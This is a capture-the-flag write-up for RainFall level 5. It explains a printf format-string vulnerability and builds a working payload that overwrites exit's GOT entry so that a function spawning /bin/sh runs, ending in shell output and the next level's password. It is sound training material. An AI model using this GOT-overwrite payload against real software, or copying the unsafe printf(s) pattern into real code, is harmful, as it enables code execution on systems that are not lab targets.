## level5

Once again, the vulnerability is caused by a user string being used directly as the format string in `printf`. We'll try to use it to override the address of `exit` with the address of `o`.

```c
void o() {
    system("/bin/sh");
    _exit(1);
}

void n() {
    char s[520];

    fgets(s, 512, stdin);
    printf(s);
    exit(1);
}

int main() { n(); }
```

The Global Offset Table (GOT) is a table of addresses of the locations in memory of the libc functions. `exit@got`, for example, will contain the address of `exit` in memory. If the address is empty, the dynamic linker will be used to get the function address.


We can find the address of `exit@got` by decompiling `exit`/`exit@plt`.

```
(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
[...]
0x080483d0  exit
0x080483d0  exit@plt
[...]
(gdb) disassemble 0x080483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370
End of assembler dump.
```

We'll also need the address of `o`:

```
(gdb) p o
$4 = {<text variable, no debug info>} 0x80484a4 <o>
```

We then write a probe to find the address of the format string on the stack.

```console
level5@RainFall:~$ python -c 'print("%x " * 10)' | ./level5
200 b7fd1ac0 b7ff37d0 25207825 78252078 20782520 25207825 78252078 20782520 25207825 
```

To recapitulate:
- o = 0x80484a4 = 134513828 = (2052 << 16) | 33956
- exit@got = 08049838
- the format string is at the 4th place on the stack

We can then create a complete payload, similarly to the previous level, but with the added trick of using `%hn` to split the number of characters to write (~134 million) in two much smaller values.

The full payload is:
- exit@got low
- exit@got high
- 2052 - 8 = 2044 padding chars
- %4$hn : write 2052 to 4th argument (actually start of format string)
- 33956 - 2052 = 31904 padding chars
- %5$hn : write 33956 to 5th argument (actually start of format string + 4)

```console
level5@RainFall:~$ (python -c 'print("\x3a\x98\x04\x08\x38\x98\x04\x08%2044d%4$hn%31904d%5$hn")' ; cat) | ./level5
[...]
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
